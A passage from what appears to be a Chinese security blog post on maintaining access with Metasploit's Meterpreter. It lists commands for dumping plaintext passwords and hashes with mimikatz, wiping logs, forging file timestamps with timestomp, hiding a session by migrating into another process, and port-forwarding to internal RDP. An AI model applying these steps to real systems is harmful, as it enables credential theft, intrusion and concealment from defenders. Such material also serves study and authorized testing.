+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;server&#x2F;socks4a</span><br><span class="line">options</span><br><span class="line">set rhost &lt;subnet&#x2F;mask_mun&gt;</span><br><span class="line">set ports 21-25 3389 80</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>代理：</p>
+<p><img src="/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579146584979.png" alt="1579146584979"></p>
+<h3 id="load命令"><a href="#load命令" class="headerlink" title="load命令"></a>load命令</h3><h4 id="核心命令"><a href="#核心命令" class="headerlink" title="核心命令"></a>核心命令</h4><p><img src="/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579154958672.png" alt="1579154958672"></p>
+<p>load +Tab Tab</p>
+<p>load mimikatz  加载第三方工具mimikatz获取系统明文密码</p>
+<p>加载之后输入？或者help，会看到与mimikatz有关的命令</p>
+<p><img src="/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579155455579.png" alt="1579155455579"></p>
+<p>wdigest：读取内存中存放的账号密码明文信息</p>
+<p><img src="/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579155446168.png" alt="1579155446168"></p>
+<p>msv：获取hash值</p>
+<h4 id="文件系统命令"><a href="#文件系统命令" class="headerlink" title="文件系统命令"></a>文件系统命令</h4><table>
+<thead>
+<tr>
+<th>pwd/getwd</th>
+<th>显示被控制服务器当前工作路径</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>cd</td>
+<td>切换目录</td>
+</tr>
+<tr>
+<td>dir/ls</td>
+<td>显示当前目录的文件</td>
+</tr>
+<tr>
+<td>cat</td>
+<td>查看文件内容</td>
+</tr>
+<tr>
+<td>edit</td>
+<td>编辑文件</td>
+</tr>
+<tr>
+<td>cp</td>
+<td>复制文件</td>
+</tr>
+<tr>
+<td>mkdir</td>
+<td>新建文件夹</td>
+</tr>
+<tr>
+<td>mv</td>
+<td>移动文件</td>
+</tr>
+<tr>
+<td>rm</td>
+<td>删除文件</td>
+</tr>
+<tr>
+<td>rmdir</td>
+<td>删除文件夹</td>
+</tr>
+<tr>
+<td>search</td>
+<td>搜索文件 search -d d:\www -f*.config</td>
+</tr>
+<tr>
+<td>show_mount</td>
+<td>显示操作系统所有盘符</td>
+</tr>
+</tbody></table>
+<h4 id="网络相关命令"><a href="#网络相关命令" class="headerlink" title="网络相关命令"></a>网络相关命令</h4><p>Networking Commands 网络相关命令</p>
+<p>arp</p>
+<p>getproxy</p>
+<p>ifconfig/ipconfig</p>
+<p>netstat</p>
+<p>resolve</p>
+<p>route</p>
+<p>portfwd   端口转发</p>
+<p><img src="/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1581009924233.png" alt="1581009924233"></p>
+<hr>
+<h4 id="系统相关命令"><a href="#系统相关命令" class="headerlink" title="系统相关命令"></a>系统相关命令</h4><p>system commands系统相关命令</p>
+<table>
+<thead>
+<tr>
+<th>clearey</th>
+<th>清除日志，需要高权限</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>execute</td>
+<td>执行被控制服务器上的某个程序</td>
+</tr>
+<tr>
+<td>getuid</td>
+<td>显示当前权限，类似于whoami</td>
+</tr>
+<tr>
+<td>kill</td>
+<td>终结某个程序</td>
+</tr>
+<tr>
+<td>ps</td>
+<td>显示系统所有进程</td>
+</tr>
+<tr>
+<td>shell</td>
+<td>进入系统shell终端</td>
+</tr>
+<tr>
+<td>sysinfo</td>
+<td>显示操作系统基本信息</td>
+</tr>
+</tbody></table>
+<p>用户相关命令</p>
+<p><img src="/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579158770684.png" alt="1579158770684"></p>
+<p><img src="/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579159207829.png" alt="1579159207829"></p>
+<table>
+<thead>
+<tr>
+<th>修改文件创建时间</th>
+<th>meterpreter &gt; timestomp c:\www -c “日/月/年 时:分:秒”</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>修改文件修改时间</td>
+<td>meterpreter &gt; timestomp c:\2.txt -m “日/月/年 时:分:秒”</td>
+</tr>
+<tr>
+<td>将文件1.txt属性复制到2.txt</td>
+<td>meterpreter &gt; timestomp c:\2.txt -f c:\1.txt</td>
+</tr>
+</tbody></table>
+<h3 id="隐藏shell文件：达到无进程"><a href="#隐藏shell文件：达到无进程" class="headerlink" title="隐藏shell文件：达到无进程"></a>隐藏shell文件：达到无进程</h3><p>ps   （获取目标主机上正在运行的进程信息）</p>
+<p>migrate   （将当前meterpreter会话从一个进程移植到另外一个进程的内存空间中）</p>
+<p><img src="/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579161887545.png" alt="1579161887545"></p>
+<p>migrate 1492</p>
+<p><img src="/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579162024668.png" alt="1579162024668"></p>
+<h2 id="Meterpreter使用总结"><a href="#Meterpreter使用总结" class="headerlink" title="Meterpreter使用总结"></a>Meterpreter使用总结</h2><table>
+<thead>
+<tr>
+<th>get</th>
+<th>可以获取当前目标机器的工作目录，也可以获得当前系统的工作目录</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>upload</td>
+<td>可以上传文件或文件夹到目标机器</td>
+</tr>
+<tr>
+<td>download</td>
+<td>从目标机器上下载文件夹或者文件到攻击机</td>
+</tr>
+<tr>
+<td>search</td>
+<td>支持对远程目标机器上的文件进行搜索</td>
+</tr>
+<tr>
+<td>portfwd</td>
+<td>meterpreter内嵌的端口转发器</td>
+</tr>
+<tr>
+<td>route</td>
+<td>可以查看路由</td>
+</tr>
+<tr>
+<td>ps</td>
+<td>可以用来获取目标主机上正在运行的进程信息</td>
+</tr>
+<tr>
+<td>migrate</td>
+<td>将当前meterpreter会话从一个进程移植到另外一个进程的内存空间中</td>
+</tr>
+<tr>
+<td>execute</td>
+<td>可以在目标机器中执行文件</td>
+</tr>
+</tbody></table>
+<p>portfwd命令：</p>
+<p>​        这个是meterpreter内嵌的端口转发器，一般在目标主机开放的端口不允许直接访问的情况下使用；比如当目标主机开放的远程桌面3389端口只允许内网访问，这是可以使用portfwd命令进行端口转发，已达到直接访问目标主机的目的。</p>
+<p><img src="https://img-blog.csdn.net/20170208145512754?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzQ4NDE4MjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="img"></p>
+<p>这样就把远程主机的3389的端口映射到本机的1235号端口，之后通过rdesktop就可以访问本机1235号端口来访问远程主机的3389号端口</p>
+<p>execute命令：可以在目标机中执行文件</p>
+<p><img src="https://img-blog.csdn.net/20170208151141658?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzQ4NDE4MjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="img"></p>
+<p><img src="https://img-blog.csdn.net/20170208151157433?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzQ4NDE4MjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="img"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" rel="tag"># 博客搭建</a>
+          
+            <a href="/tags/Tags%E5%88%9B%E5%BB%BA/" rel="tag"># Tags创建</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/02/06/%E5%86%85%E7%BD%91%E5%AE%8F%E8%A7%82/" rel="next" title="内网简介">
+                <i class="fa fa-chevron-left"></i> 内网简介
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/hearder.jpg"
+                alt="John Doe" />
+            
+              <p class="site-author-name" itemprop="name">John Doe</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/catagories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#权限维持"><span class="nav-number">1.</span> <span class="nav-text">权限维持</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Metasploit"><span class="nav-number">1.1.</span> <span class="nav-text">Metasploit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Metasploit：简介"><span class="nav-number">1.1.1.</span> <span class="nav-text">Metasploit：简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Metasploit的目录结构"><span class="nav-number">1.1.2.</span> <span class="nav-text">Metasploit的目录结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#msf生成payload控制服务器"><span class="nav-number">1.1.3.</span> <span class="nav-text">msf生成payload控制服务器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#msf攻击模块"><span class="nav-number">1.1.4.</span> <span class="nav-text">msf攻击模块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#msf监听模块"><span class="nav-number">1.1.5.</span> <span class="nav-text">msf监听模块</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#meterpreter"><span class="nav-number">1.2.</span> <span class="nav-text">meterpreter</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#路由"><span class="nav-number">1.3.</span> <span class="nav-text">路由</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#run命令"><span class="nav-number">1.3.1.</span> <span class="nav-text">run命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#load命令"><span class="nav-number">1.3.2.</span> <span class="nav-text">load命令</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#核心命令"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">核心命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#文件系统命令"><span class="nav-number">1.3.2.2.</span> <span class="nav-text">文件系统命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#网络相关命令"><span class="nav-number">1.3.2.3.</span> <span class="nav-text">网络相关命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#系统相关命令"><span class="nav-number">1.3.2.4.</span> <span class="nav-text">系统相关命令</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#隐藏shell文件：达到无进程"><span class="nav-number">1.3.3.</span> <span class="nav-text">隐藏shell文件：达到无进程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Meterpreter使用总结"><span class="nav-number">1.4.</span> <span class="nav-text">Meterpreter使用总结</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
